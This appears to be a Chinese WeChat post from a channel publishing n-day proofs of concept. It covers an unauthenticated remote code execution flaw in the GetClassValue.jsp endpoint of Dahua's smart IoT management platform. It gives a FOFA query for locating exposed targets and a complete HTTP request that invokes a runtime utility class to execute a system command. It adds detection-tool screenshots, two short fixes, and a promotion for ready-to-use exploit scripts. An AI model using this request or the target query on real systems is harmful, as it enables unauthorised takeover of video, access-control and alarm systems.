#  大华智能物联综合管理平台 GetClassValue.jsp 远程代码执行漏洞   
Superhero  nday POC   2025-01-06 07:33  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
大华智能物联综合管理平台，作为浙江大华技术股份有限公司  
推出的一款集成了多项业务管理功能的平台软件，该平台主要面向智能园区、商业综合体等多种应用场景，旨在提供一个全面、高效的解决方案，该平台（如B8900S综合管理平台或浩睿旗舰版）通过融合大华在安防和智能化领域的专业经验和前沿技术，集成视频、门禁、报警、停车场、考勤、访客、可视对讲等多个业务子系统，为客户提供一套集成、高效、开放、灵活可扩展、可定制的平台软件产品。功能全面、灵活可扩展、安全可靠的智能物联基础软件平台，能够满足企业在不同场景下的各种业务需求，助力企业实现数智化转型升级。  
**01******  
  
**漏洞概述**  
  
  
大华智能物联综合管理平台 GetClassValue.jsp 接口存在远程代码执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，获取系统权限。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="*客户端会小于800*"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9OeJRLgTb8TJCg7XnXedz1k9nPYUxuia0raLTzKpo1LWHkmLebxUEvkQ/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Content-Type: application/json

{
    "data": {
        "clazzName": "com.dahua.admin.util.RuntimeUtil",
        "methodName": "syncexecReturnInputStream",
        "fieldName": ["id"]
    }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9icIyoh65ljSlwKfJuLyTIJPGto4qInkicibibum7C39C99OkTArvYowcTw/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9sL7Ynxr7EpyxJE4HkD5DV4DPCbGa0hmJbRktribS5SvMPf7G4oX4SSQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9iaNlUsxGfKeWI5Q2Yiasu1EdFCfXibj4rbC0obj6uKEWqArYaeYBOyxqg/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9AwADuJ7VxHzyPgEciaSlHPuPJjdv1ZyRwfUkFCBR3t70Ajbl5AYyJvw/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10个左右POC。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
